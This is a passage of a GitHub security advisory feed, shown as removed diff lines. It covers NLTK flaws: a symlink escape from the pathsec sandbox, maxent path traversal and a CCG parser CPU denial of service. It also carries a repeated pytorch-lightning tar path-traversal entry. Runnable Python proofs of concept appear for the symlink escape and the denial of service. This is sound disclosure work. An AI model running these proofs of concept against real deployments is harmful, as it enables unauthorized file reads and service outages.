-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x4p7-2mv3-x7px</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-13T12:31:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Symlink escape in chat80.sql_query bypasses the pathsec data-root sandbox to read out-of-root SQLite databases]]></title>
-        <id>https://github.com/advisories/GHSA-xmfg-f9cm-w86q</id>
-        <link href="https://github.com/advisories/GHSA-xmfg-f9cm-w86q"/>
-        <updated>2026-11-16T14:47:24.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&gt;= 3.9.4, &lt;= 3.10.3</code></td>
-<td><code>3.10.4</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p><code>nltk.sem.chat80.sql_query()</code> opens a SQLite database by handing the result of <code>nltk.data.find(dbname)</code> straight to <code>sqlite3.connect()</code> without the path-containment check that the NLTK data sandbox (<code>nltk.pathsec</code>) is meant to enforce. <code>nltk.data.find()</code> applies only lexical checks to the resource name and returns a <code>FileSystemPathPointer</code> whose path is normalized with <code>os.path.abspath</code> but never resolved for symlinks. As a result, an in-root symbolic link that points at a SQLite file outside every registered NLTK data root is followed by SQLite, and the caller receives query results from the out-of-sandbox database. An attacker who can place a file inside a directory the application trusts as an NLTK data root can read SQLite databases that the pathsec sandbox is supposed to keep out of reach.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p>The security invariant is that file access performed through NLTK data resolution must stay within the configured data roots; the sandbox enforces this in <code>nltk.pathsec</code> via <code>validate_path</code> and <code>pathsec.open</code>, which resolve the real path (<code>Path(...).resolve()</code>) and reject targets outside the allowed roots. <code>sql_query()</code> never reaches that enforcement point. It calls <code>nltk.data.find(dbname)</code>, whose guards operate purely on the resource-name string, and <code>FileSystemPathPointer.__init__</code> performs only <code>os.path.abspath</code> plus an existence check, which does not collapse symlinks. The pointer is then passed to <code>sqlite3.connect(str(path))</code>, so the containment decision that <code>FileSystemPathPointer.open()</code> would delegate to <code>pathsec.open</code> is bypassed entirely. The sibling functions in the same module that create or write databases (<code>cities2table</code>, <code>val_dump</code>, <code>val_load</code>) obtain their protection from a validation call in later development, but the read sink <code>sql_query</code> performs no equivalent check in any published release.</p>
-<pre><code class="language-text">nltk/sem/chat80.py  -&gt; sql_query(): path = nltk.data.find(dbname); sqlite3.connect(str(path))
-nltk/data.py        -&gt; find(): lexical name guards only; returns FileSystemPathPointer
-nltk/data.py        -&gt; FileSystemPathPointer.__init__(): os.path.abspath + os.path.exists (no symlink resolution)
-nltk/data.py        -&gt; FileSystemPathPointer.open() -&gt; nltk.pathsec.open (the containment guard that sql_query never calls)
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can write into a directory the application registers as an NLTK data root (a shared or writable corpus directory, or a downloaded corpus) can plant a symbolic link at the expected resource location that points at a SQLite database elsewhere on the filesystem. When the application invokes <code>sql_query()</code> (directly or via <code>sql_demo()</code>) for that resource, SQLite follows the link and the query executes against the out-of-sandbox database, returning its rows to the caller. This escapes the pathsec confidentiality boundary. The read primitive is bounded to SQLite-format files that are readable by the process user: a non-SQLite target raises <code>sqlite3.DatabaseError</code> rather than leaking content. A caller-supplied write query would be redirected onto the out-of-sandbox target and SQLite may create sidecar files (<code>-wal</code>, <code>-journal</code>) next to it, which is a plausible integrity side effect rather than a demonstrated arbitrary-write primitive. Exploitation requires the same local write capability into a trusted data root as the related symlink-read sandbox-escape issues already recorded for this project.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p><code>Requires the published nltk 3.10.3 wheel and a writable directory registered as an NLTK data root. No network access is needed.</code></p>
-<ol>
-<li>Create a throwaway data root with the expected corpus subdirectory.</li>
-<li>Create a SQLite database outside that root and populate it.</li>
-<li>Plant an in-root symbolic link at <code>corpora/city_database/city.db</code> pointing at the outside database.</li>
-<li>Register the data root and call <code>sql_query()</code> for the in-root resource name.</li>
-</ol>
-<pre><code class="language-python">import os, tempfile, sqlite3, nltk, nltk.data
-from nltk.sem import chat80
-
-work = tempfile.mkdtemp()
-root = os.path.join(work, "nltk_data")
-corp = os.path.join(root, "corpora", "city_database")
-os.makedirs(corp)
-
-secret = os.path.join(work, "outside", "secret.db")
-os.makedirs(os.path.dirname(secret))
-con = sqlite3.connect(secret)
-con.execute("CREATE TABLE t (x text)")
-con.execute("INSERT INTO t VALUES ('OUT-OF-SANDBOX-SECRET')")
-con.commit(); con.close()
-
-os.symlink(secret, os.path.join(corp, "city.db"))
-nltk.data.path.insert(0, root)
-
-ptr = nltk.data.find("corpora/city_database/city.db")
-try:
-    ptr.open().read()            # pathsec route: blocked
-except Exception as e:
-    print("open() blocked:", type(e).__name__)
-
-cur = chat80.sql_query("corpora/city_database/city.db", "SELECT * FROM t")
-print("sql_query rows:", cur.fetchall())   # sink route: follows the symlink
-</code></pre>
-<pre><code class="language-text">open() blocked: PermissionError
-sql_query rows: [('OUT-OF-SANDBOX-SECRET',)]
-</code></pre>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li><strong>Exposure:</strong> The application exposes <code>sql_query()</code> (or <code>sql_demo()</code>, which calls it) and resolves the target database through <code>nltk.data.find</code>, using at least one directory the attacker can write to as a data root.</li>
-<li><strong>Control:</strong> The attacker controls the on-disk object at the in-root resource path, replacing it with a symbolic link whose target is chosen freely. The resource-name argument stays a clean, in-root string.</li>
-<li><strong>Path:</strong> <code>nltk.data.find</code> applies its lexical name guards (<code>_UNSAFE_NO_PROTOCOL_RE</code>, encoded and normalized-form checks), which inspect only the name string and pass, then returns a <code>FileSystemPathPointer</code> whose <code>__init__</code> applies <code>os.path.abspath</code> and an existence check without resolving the symlink.</li>
-<li><strong>Guard:</strong> The containment guard (<code>FileSystemPathPointer.open()</code> delegating to <code>nltk.pathsec.open</code>, which resolves the real path and rejects out-of-root targets) is never invoked, because <code>sql_query()</code> passes the raw pointer string to <code>sqlite3.connect()</code> instead of opening through the pointer.</li>
-<li><strong>Primitive:</strong> <code>sqlite3.connect(str(path))</code> opens the symlink target; the kernel follows the link out of every data root and the cursor executes the query against the outside database.</li>
-<li><strong>Result:</strong> Rows from a SQLite database outside the sandbox are returned to the caller, escaping the pathsec confidentiality boundary for SQLite-format files readable by the process user.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<p>The relevant guard is the pathsec containment enforced by <code>nltk.pathsec.open</code>/<code>validate_path</code>, reached through <code>FileSystemPathPointer.open()</code>. On an identical pointer produced from the planted symlink, <code>ptr.open()</code> raises <code>PermissionError</code> with an "Unauthorized path" security violation, confirming the guard is active and correct for the sandbox route. <code>sql_query()</code> does not call <code>.open()</code> and does not call <code>validate_path</code>; it passes the unresolved pointer string directly to <code>sqlite3.connect()</code>, so the guard never runs on this path and the read succeeds. Attempts to invalidate the finding were made and failed: <code>nltk.data.find</code> was checked for a hidden containment or real-path resolution and has none (its guards are name-string only, and <code>FileSystemPathPointer.__init__</code> uses <code>abspath</code>, not <code>realpath</code>); SQLite was confirmed to follow the link and read the outside file rather than opening the link node; and the possibility that an existing published fix already covers this sink was refuted by inspecting the published artifacts, where no containment check is present on <code>sql_query</code>. The behavior was reproduced against the exact published 3.10.3 wheel (verified by its published SHA-256 digest).</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li><code>Ecosystem: PyPI</code></li>
-<li><code>Package: nltk</code></li>
-<li><code>Confirmed affected range: &gt;= 3.9.4, &lt;= 3.10.3</code></li>
-<li><code>Latest release checked: 3.10.3 (PyPI, wheel SHA-256 ff9598a8e20518ee0d557745890cc4435b9578489e2dcbc69c4f81fa060caf7c)</code></li>
-<li><code>Fix status: 3.10.4</code></li>
-</ul>
-<p>The pathsec sandbox that this issue bypasses was introduced in 3.9.4; the immediately preceding release 3.9.3 does not ship <code>nltk/pathsec.py</code> and therefore does not present this sandbox-escape surface. Every published release from 3.9.4 through the current latest 3.10.3 ships <code>nltk/pathsec.py</code> with <code>ENFORCE = True</code> and ships <code>sql_query()</code> without any containment check, so all of them are affected. Each affected wheel was fetched from PyPI and inspected directly. No published release removes the sink or adds the guard, so no fixed version exists at the time of review.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Enforce the data-root containment invariant on the resolved database path before opening it. In <code>sql_query()</code>, validate the path through the same mechanism the sibling functions use (for example <code>validate_path(str(path), context="chat80.sql_query")</code>) or open the database through the pointer's sandboxed open path rather than passing the raw string to <code>sqlite3.connect()</code>. The remediation should resolve symbolic links (real-path resolution) and reject targets outside the registered data roots, and it should cover any other read sinks that connect to on-disk databases resolved through <code>nltk.data.find</code>. As an interim mitigation, applications should ensure that no attacker-writable directory is registered as an NLTK data root and should avoid calling <code>sql_query</code>/<code>sql_demo</code> on resources that live in shared or untrusted locations.</p>
-<p>Reported by zx (GitHub: @manus-pi).</p>
-<h2 id="fix-status-2026-09-28">Fix status (2026-09-28)</h2>
-<p>Status: IN PROGRESS (fix on an open pull request, not yet on develop).</p>
-<p>PR: #3888 "Validate chat80.sql_query dbname for path containment (CWE-59/73)", open; head e0e890f51 at the time of this note. This is the same sink and vector as GHSA-xv54-447f-mj22 (now closed).</p>
-<p>Fix commits: 9f5d2ea6d (sql_query calls validate_path before nltk.data.find, as cities2table, val_dump and val_load already do) and 47bd0476e (the file behind a sql_query resource name is resolved through the data roots and validated, and its store is pinned).</p>
-<p>The advisory PoC (an in-root corpora/city_database/city.db symlink to an out-of-root SQLite file, resolved through find()) re-run on the PR head e0e890f51: refused with PermissionError (Security Violation [chat80.sql_query]: Unauthorized path, naming the symlink's resolved out-of-root target); the same resource name backed by a real in-root database still returns its rows on that head. On develop 2fa3f48fe the PoC returns the rows of the out-of-root database, so develop is VULNERABLE.</p>
-<p>Probe: nltk/test/unit/security_probes/ghsa_xv54_447f_mj22.py on the PR (the sibling advisory GHSA-xv54-447f-mj22), FIXED on the PR head (absolute path, traversal and a symlink inside a scratch directory are all security-rejected). Those three cases are also rejected on develop by find() itself; the in-root symlink above is the case that only the PR closes.</p>
-<p>Release: none.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-xmfg-f9cm-w86q">https://github.com/nltk/nltk/security/advisories/GHSA-xmfg-f9cm-w86q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126302">https://nvd.nist.gov/vuln/detail/CVE-2026-126302</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-3.9.4-before-3.10.4-symlink-sandbox-escape-via-chat80-sql-query">https://www.vulncheck.com/advisories/nltk-3.9.4-before-3.10.4-symlink-sandbox-escape-via-chat80-sql-query</a></li>
-<li><a href="https://github.com/advisories/GHSA-xmfg-f9cm-w86q">https://github.com/advisories/GHSA-xmfg-f9cm-w86q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xmfg-f9cm-w86q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-16T14:47:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Symlink escape in chat80.sql_query bypasses the pathsec data-root sandbox to read out-of-root SQLite databases]]></title>
-        <id>https://github.com/advisories/GHSA-w2j9-qh3j-4h63</id>
-        <link href="https://github.com/advisories/GHSA-w2j9-qh3j-4h63"/>
-        <updated>2026-11-16T14:47:06.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&gt;= 3.9.4, &lt;= 3.10.3</code></td>
-<td>No fix available</td>
-</tr>
-</tbody>
-</table>
-<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-xmfg-f9cm-w86q. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>NLTK from 3.9.4 before 3.10.4 contains a symlink following vulnerability in nltk.sem.chat80.sql_query() that bypasses the pathsec data-root sandbox containment check. Attackers who can write into a trusted NLTK data root can plant a symbolic link to read SQLite databases outside the sandbox.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-xmfg-f9cm-w86q">https://github.com/nltk/nltk/security/advisories/GHSA-xmfg-f9cm-w86q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126302">https://nvd.nist.gov/vuln/detail/CVE-2026-126302</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-3.9.4-before-3.10.4-symlink-sandbox-escape-via-chat80-sql-query">https://www.vulncheck.com/advisories/nltk-3.9.4-before-3.10.4-symlink-sandbox-escape-via-chat80-sql-query</a></li>
-<li><a href="https://github.com/advisories/GHSA-w2j9-qh3j-4h63">https://github.com/advisories/GHSA-w2j9-qh3j-4h63</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w2j9-qh3j-4h63</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-13T12:31:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Path Traversal in save_maxent_params / load_maxent_params Allow Arbitrary File READ/WRITE]]></title>
-        <id>https://github.com/advisories/GHSA-59f9-gqg8-mqpj</id>
-        <link href="https://github.com/advisories/GHSA-59f9-gqg8-mqpj"/>
-        <updated>2026-11-16T14:46:26.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt;= 3.10.3</code></td>
-<td><code>3.10.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>Path traversal in NLTK's save_maxent_params() and load_maxent_params() allows arbitrary file write and arbitrary file read outside the directories permitted by NLTK's pathsec security mechanism.</p>
-<p>This vulnerability was previously reported through Huntr, accepted by the NLTK project, and assigned CVE-2026-15367. A $750 bounty was paid through Huntr (i didnt get the fix bounty). Huntr subsequently shut down its OSS vulnerability program, so I am submitting this report through GitHub to continue the existing disclosure process and preserve the original CVE assignment and researcher credit.</p>
-<h3 id="details">Details</h3>
-<p>The affected functions are:</p>
-<ul>
-<li>nltk.classify.maxent.load_maxent_params()</li>
-<li>nltk.classify.maxent.save_maxent_params()</li>
-</ul>
-<p>Both functions construct filesystem paths from the caller-controlled tab_dir argument and access them using Python's built-in open() without passing the paths through NLTK's pathsec validation.</p>
-<p>For example, load_maxent_params() constructs and opens:</p>
-<ul>
-<li>/weights.txt</li>
-<li>/mapping.tab</li>
-<li>/labels.txt</li>
-<li>/alwayson.tab</li>
-</ul>
-<p>Similarly, save_maxent_params() creates/writes files under the supplied tab_dir.</p>
-<p>This bypasses the security boundary provided by nltk.pathsec. NLTK documents pathsec as the mechanism for restricting filesystem access to permitted roots, with strict enforcement intended to prevent unauthorized filesystem access.</p>
-<p>The relevant implementation is in:</p>
-<p>nltk/classify/maxent.py</p>
-<p>The affected functions can be found in the model parameter loading/saving section of that file.</p>
-<p>This issue was previously disclosed through Huntr and accepted before the Huntr OSS program was shut down. The original Huntr report was assigned CVE-2026-15367 and received a $750 bounty.</p>
-<p>I am therefore submitting this GitHub Security Advisory primarily as a continuation/transfer of the existing disclosure rather than as a new vulnerability report.</p>
-<h3 id="poc">PoC</h3>
-<p>The issue can be reproduced by enabling NLTK's path security enforcement and supplying a tab_dir outside the permitted root.</p>
-<p>For example, with a controlled test environment:</p>
-<pre><code class="language-py">import os
-import tempfile
-import nltk.pathsec as pathsec
-from nltk.classify.maxent import load_maxent_params, save_maxent_params
-
-pathsec.ENFORCE = True
-
-allowed_dir = tempfile.mkdtemp()
-outside_dir = tempfile.mkdtemp()
-
-# The same outside-root path is rejected when accessed through pathsec.
-try:
-    with pathsec.open(os.path.join(outside_dir, "test.txt"), "w") as f:
-        f.write("test")
-except Exception as e:
-    print("pathsec.open rejected outside-root access:", type(e).__name__)
-
-# The vulnerable model-parameter APIs directly use open()
-# on paths derived from tab_dir.
-#
-# Supplying outside_dir as tab_dir causes the functions to access
-# files under outside_dir rather than enforcing the pathsec boundary.
-</code></pre>
-<p>For save_maxent_params(), the attacker-controlled tab_dir determines where the model parameter files are written.</p>
-<p>For load_maxent_params(), the attacker-controlled tab_dir determines which files are read.</p>
-<p>The important security property being bypassed is that pathsec.ENFORCE = True does not protect these file operations because the affected functions call the built-in open() directly rather than the pathsec-aware file-opening mechanism.</p>
-<h3 id="impact">Impact</h3>
-<p>This is a path traversal / filesystem sandbox bypass resulting in arbitrary local file read and arbitrary local file write.</p>
-<p>Applications that use NLTK's pathsec mechanism as a filesystem security boundary may incorrectly assume that model parameter loading and saving are restricted to approved directories.</p>
-<p>An attacker who can influence the tab_dir argument may therefore:</p>
-<ul>
-<li>read files outside the permitted NLTK data directories through load_maxent_params();</li>
-<li>create or overwrite files outside the permitted directories through save_maxent_params();</li>
-<li>bypass the filesystem containment provided by nltk.pathsec.</li>
-</ul>
-<p>The practical impact depends on how an application exposes these APIs and what filesystem permissions the NLTK process has.</p>
-<h3 id="existing-cve--disclosure-history">Existing CVE / Disclosure History</h3>
-<p>CVE: CVE-2026-15367</p>
-<p>This vulnerability was previously reported and accepted through Huntr before the Huntr OSS vulnerability program was shut down. The report received a $750 bounty and a CVE was reserved.</p>
-<p>I am submitting this report because the original Huntr disclosure workflow is no longer available and the CVE has not yet been published.</p>
-<p>Please associate this report with CVE-2026-15367 rather than assigning a new CVE, unless the NLTK maintainers determine that the existing CVE does not correspond to this issue.</p>
-<h2 id="fix-status-2026-09-28">Fix status (2026-09-28)</h2>
-<p>Status: MERGED on develop. The load side is in every release since 3.9.4 (including v3.10.3); the save side is on develop and unreleased.</p>
-<p>Fix commits: f2556f9e1 (load_maxent_params reads through open_datafile on a PathPointer whose open is pathsec.open; contained in tag 3.9.4 and every later tag) and 2a92b7182 (save_maxent_params validates tab_dir and writes every parameter file through pathsec.open), PR #3759 "Harden maxent / named-entity model-artifact saves against shared-tmp planting", merged 2026-08-18, merge commit a167e94bc on develop.</p>
-<p>Probe: nltk/test/unit/security_probes/ghsa_59f9_gqg8_mqpj.py, added on the open PR #3753 (head da55cab0e at the time of this note; measured on its earlier head 238f81500) together with commit 15f84f036 (load_maxent_params accepts a plain str or Path through FileSystemPathPointer). Verdict on 238f81500: FIXED (save and load outside every data root refused by pathsec). The same probe run against develop 2fa3f48fe reports the save refused and a PathPointer load refused, while a str or Path tab_dir raises AttributeError before any file is opened (the probe counts that crash as not fixed; no file is read or written).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-59f9-gqg8-mqpj">https://github.com/nltk/nltk/security/advisories/GHSA-59f9-gqg8-mqpj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126296">https://nvd.nist.gov/vuln/detail/CVE-2026-126296</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3759">https://github.com/nltk/nltk/pull/3759</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/2a92b71827d754ae8920261e7ed0c4bb283ab2d7">https://github.com/nltk/nltk/commit/2a92b71827d754ae8920261e7ed0c4bb283ab2d7</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.4">https://github.com/nltk/nltk/releases/tag/v3.10.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-path-traversal-via-save-maxent-params-and-load-maxent-params">https://www.vulncheck.com/advisories/nltk-before-3.10.4-path-traversal-via-save-maxent-params-and-load-maxent-params</a></li>
-<li><a href="https://github.com/advisories/GHSA-59f9-gqg8-mqpj">https://github.com/advisories/GHSA-59f9-gqg8-mqpj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-59f9-gqg8-mqpj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-16T14:46:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pytorch-lightning] pytorch-lightning vulnerable to Arbitrary File Write via /v1/runs API endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</id>
-        <link href="https://github.com/advisories/GHSA-mr7h-w2qc-ffc2"/>
-        <updated>2026-11-16T14:43:15.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>pytorch-lightning</td>
-<td><code>&lt; 2.3.3</code></td>
-<td><code>2.3.3</code></td>
-</tr>
-</tbody>
-</table>
-<p>A vulnerability in the /v1/runs API endpoint of lightning-ai/pytorch-lightning v2.2.4 allows attackers to exploit path traversal when extracting tar.gz files. When the LightningApp is running with the plugin_server, attackers can deploy malicious tar.gz plugins that embed arbitrary files with path traversal vulnerabilities. This can result in arbitrary files being written to any directory in the victim's local file system, potentially leading to remote code execution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5980">https://nvd.nist.gov/vuln/detail/CVE-2024-5980</a></li>
-<li><a href="https://huntr.com/bounties/55a6ac6f-89c7-42ea-86f3-c6e93a2679f3">https://huntr.com/bounties/55a6ac6f-89c7-42ea-86f3-c6e93a2679f3</a></li>
-<li><a href="https://github.com/Lightning-AI/pytorch-lightning/pull/20039">https://github.com/Lightning-AI/pytorch-lightning/pull/20039</a></li>
-<li><a href="https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3">https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3</a></li>
-<li><a href="https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a">https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-386.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-386.yaml</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3975.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3975.yaml</a></li>
-<li><a href="https://pypi.org/project/lightning">https://pypi.org/project/lightning</a></li>
-<li><a href="https://github.com/advisories/GHSA-mr7h-w2qc-ffc2">https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2024-06-27T21:32:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[lightning] pytorch-lightning vulnerable to Arbitrary File Write via /v1/runs API endpoint]]></title>
-        <id>https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</id>
-        <link href="https://github.com/advisories/GHSA-mr7h-w2qc-ffc2"/>
-        <updated>2026-11-16T14:43:15.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>lightning</td>
-<td><code>&lt; 2.3.3</code></td>
-<td><code>2.3.3</code></td>
-</tr>
-</tbody>
-</table>
-<p>A vulnerability in the /v1/runs API endpoint of lightning-ai/pytorch-lightning v2.2.4 allows attackers to exploit path traversal when extracting tar.gz files. When the LightningApp is running with the plugin_server, attackers can deploy malicious tar.gz plugins that embed arbitrary files with path traversal vulnerabilities. This can result in arbitrary files being written to any directory in the victim's local file system, potentially leading to remote code execution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5980">https://nvd.nist.gov/vuln/detail/CVE-2024-5980</a></li>
-<li><a href="https://huntr.com/bounties/55a6ac6f-89c7-42ea-86f3-c6e93a2679f3">https://huntr.com/bounties/55a6ac6f-89c7-42ea-86f3-c6e93a2679f3</a></li>
-<li><a href="https://github.com/Lightning-AI/pytorch-lightning/pull/20039">https://github.com/Lightning-AI/pytorch-lightning/pull/20039</a></li>
-<li><a href="https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3">https://github.com/Lightning-AI/pytorch-lightning/releases/tag/2.3.3</a></li>
-<li><a href="https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a">https://github.com/lightning-ai/pytorch-lightning/commit/330af381de88cff17515418a341cbc1f9f127f9a</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-386.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/lightning/PYSEC-2026-386.yaml</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3975.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pytorch-lightning/PYSEC-2026-3975.yaml</a></li>
-<li><a href="https://pypi.org/project/lightning">https://pypi.org/project/lightning</a></li>
-<li><a href="https://github.com/advisories/GHSA-mr7h-w2qc-ffc2">https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mr7h-w2qc-ffc2</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2024-06-27T21:32:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Quadratic-time CPU denial of service in CCG lexicon parser (fromstring) on wide bracket bodies and operator chains]]></title>
-        <id>https://github.com/advisories/GHSA-89p3-fcch-88ph</id>
-        <link href="https://github.com/advisories/GHSA-89p3-fcch-88ph"/>
-        <updated>2026-11-14T00:08:50.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt;= 3.10.3</code></td>
-<td><code>3.10.4</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p>The public CCG lexicon parser <code>nltk.ccg.lexicon.fromstring</code> parses caller-influenced lexicon text with two pure-Python loops whose cost is quadratic in the input width. A service that parses an untrusted CCG lexicon string can be driven into tens of seconds of single-threaded CPU by a few-megabyte input, starving the request worker. No authentication or user interaction is required.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>matchBrackets</code> consumes a bracket body one character at a time with <code>inside = inside + rest[0]; rest = rest[1:]</code>. The <code>rest = rest[1:]</code> tail re-slice copies the entire remaining string on every iteration, so a flat bracket body costs O(n^2). <code>augParseCategory</code> drives a <code>while rest != "":</code> operator loop that re-copies the regular-expression match tail (<code>rest = app[3]</code>) once per operator, which is also O(n^2) over a long operator chain. The parser carries a recursion-depth guard (<code>MAX_PARSE_DEPTH = 500</code>) that raises on deeply nested categories, but both quadratic loops run on flat input whose nesting depth stays at zero, so that guard never fires. No bound is applied to line length or category width before the text reaches these loops.</p>
-<pre><code class="language-text">Affected functions:
-- nltk.ccg.lexicon.matchBrackets       (nltk/ccg/lexicon.py:149-172; tail re-slice at line 168)
-- nltk.ccg.lexicon.augParseCategory    (nltk/ccg/lexicon.py:223-268; APP_RE tail re-copy at line 250)
-Public entry point: nltk.ccg.lexicon.fromstring (nltk/ccg/lexicon.py:271), also re-exported as nltk.ccg.chart.fromstring.
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can influence the CCG lexicon string parsed by an application causes sustained single-threaded CPU consumption (availability loss). The vulnerable path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with attacker-chosen input size, a few-megabyte payload costs tens of seconds per core, and a small number of concurrent requests can exhaust worker threads. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only; it does not wrap these pure-Python slicing loops, so it provides no protection here.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-text">Environment: nltk 3.10.3, regex 2026.9.10, CPython. Run the parser on the shipped public API.
-</code></pre>
-<pre><code class="language-python">import nltk.ccg.lexicon as L
-
-# Vector A: flat bracket body -&gt; matchBrackets tail re-slice is O(n^2)
-n = 400000
-lex_a = ":- S\nw =&gt; (" + "a" * n + ")\n"
-
-# Vector B: long operator chain -&gt; augParseCategory tail re-copy is O(n^2)
-m = 32000
-lex_b = ":- a\nw =&gt; " + "a" + "/a" * m + "\n"
-
-import time
-for name, s in (("A", lex_a), ("B", lex_b)):
-    t = time.perf_counter()
-    try:
-        L.fromstring(s)
-    except Exception:
-        pass  # downstream parse error is irrelevant; the CPU is already burned
-    print(name, round(time.perf_counter() - t, 3), "s")
-</code></pre>
-<pre><code class="language-text">Negative control (":- a\nw =&gt; (a/a)"):   ~0.00007 s
